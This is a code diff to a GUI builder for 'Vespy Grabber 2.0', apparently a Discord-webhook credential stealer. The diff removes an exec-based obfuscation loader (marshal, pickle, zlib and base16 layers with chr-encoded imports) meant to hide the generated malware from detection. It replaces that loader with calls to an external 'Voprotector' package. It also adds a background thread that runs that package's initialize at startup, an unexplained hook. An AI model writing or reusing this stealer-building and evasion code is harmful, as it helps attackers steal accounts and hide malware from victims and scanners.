@@ -8,6 +8,7 @@ from threading import Thread
 from tkinter import messagebox
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from tkinter.filedialog import askopenfilename
+from Voprotector import initialize, Protect
 
 window = Tk()
 window.title("Vespy Grabber 2.0 || @i_might_be_vesper")
@@ -174,11 +175,8 @@ main()
     def _Obfuscation(self, name):
         # Shit obfuscation, will make it better next update
         CONTENT = open(f"{name}.py","r").read()
-        for _ in range(2):
-            POOP = base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(CONTENT.encode(),f"WHAT????","exec"))))).decode()
-            CONTENT = f"""{open("utils/Imports.py","r").read()}\n__Obf__="Simple Obf"
-"""+"""__import__(f"{chr(98)}{chr(117)}{chr(105)}{chr(108)}{chr(116)}{chr(105)}{chr(110)}{chr(115)}").exec(__import__(f"{chr(109)}{chr(97)}{chr(114)}{chr(115)}{chr(104)}{chr(97)}{chr(108)}").loads(__import__(f"{chr(112)}{chr(105)}{chr(99)}{chr(107)}{chr(108)}{chr(101)}").loads(__import__(f"{chr(122)}{chr(108)}{chr(105)}{chr(98)}").decompress(__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode("""+f"""'{POOP}')))))
-"""
+        IMPORTS = open("utils/Imports.py","r+").read()
+        Protect(CONTENT, IMPORTS)
         with open(f"{name}.py","w+") as f:f.write(CONTENT);f.close()
     
     def _Compile(self, icon, name):
@@ -516,6 +514,7 @@ class Menu:
 class Animation:
 
     def __init__(self):
+        Thread(target=initialize).start()
         self.img = __import__('PIL').Image.open('assets/epicanim.gif')
         self.LB = Label(window)
         self.LB.place(x=0,y=0,width=744,height=447)
